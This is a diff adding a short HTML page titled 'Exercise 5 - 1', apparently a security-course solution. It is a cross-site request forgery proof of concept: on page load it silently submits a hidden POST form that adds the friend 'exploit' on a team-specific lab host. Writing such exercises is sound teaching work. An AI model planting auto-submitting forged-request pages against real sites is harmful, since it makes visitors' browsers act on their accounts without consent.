@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Exercise 5 - 1</title>
+</head>
+<body onload="submit()">
+
+    <form id="addFriendForm" action="https://cdn.team0.screecher.de/addfriend" method="POST">
+        <input id="new_friend" name="new_friend" value="exploit" type="hidden"/>
+    </form>
+
+<script>
+
+    function submit(){
+        document.getElementById("addFriendForm").submit();
+    }
+</script>
+</body>
+</html>
